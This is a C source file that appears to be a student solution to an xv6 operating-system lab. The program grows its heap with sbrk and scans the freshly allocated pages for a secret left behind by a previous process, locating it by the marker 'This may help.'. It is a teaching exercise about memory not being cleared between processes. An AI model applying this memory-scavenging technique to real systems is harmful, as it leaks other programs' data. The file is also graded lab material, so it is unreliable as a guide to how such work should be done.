#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"
int strncmp(const char* p, const char* q, int n) {
  while (n > 0 && *p && *p == *q) n--, p++, q++;
  if (n == 0) return 0;
  return (uchar)*p - (uchar)*q;
}

int is_alphadigit(char ch) {
  return ('0' <= ch && ch <= '9') || ('a' <= ch && ch <= 'z') ||
         ('A' <= ch && ch <= 'Z');
}

int main(int argc, char* argv[]) {
  if (argc != 1) {
    printf("Usage: attack\n");
    exit(1);
  }

  // 根据secret.c可知最终结果一定在这句话后面
  char prefix_feature[] = "This may help.";
  int size_of_prefix = 15;

  /*---------------------找到查询范围----------------------------*/
  int page_num = 4096;        // 最大查询量为16MB
  char* start_brk = sbrk(0);  // 获取当前的程序间断点
  int i;
  for (i = 0; i < page_num; ++i) {
    if (sbrk(PGSIZE) == (char*)-1) break;  // 尽量分配内存，如果不行就立马停止
  }
  char* end_brk = sbrk(0);  // 当前页的结尾部分
  char* ans_location = 0;
  int ans_len = 0;
  /*----------------------遍历栈空间以找到secret-------------------*/
  for (char* p = start_brk; p < end_brk - size_of_prefix; ++p) {
    // 检查第一个字符是否为T以加快检验
    if (*p != 'T') continue;
    // 需要同时满足"存在前缀提示词"与"字符类型正确"两个条件
    if (strncmp(p, prefix_feature, size_of_prefix) == 0 &&
        is_alphadigit(*(p + 16))) {
      ans_location = p + 16;
      ans_len = 1;
      while (ans_location + ans_len < end_brk &&
             is_alphadigit(*(ans_location + ans_len))) {
        ++ans_len;
      }
      break;
    }
  }
  for (i = 0; i < ans_len; ++i) {
    printf("%c", *(ans_location + i));
  }
  printf("\n");
  exit(1);
}
/*

secret  xyxyz
attack


*/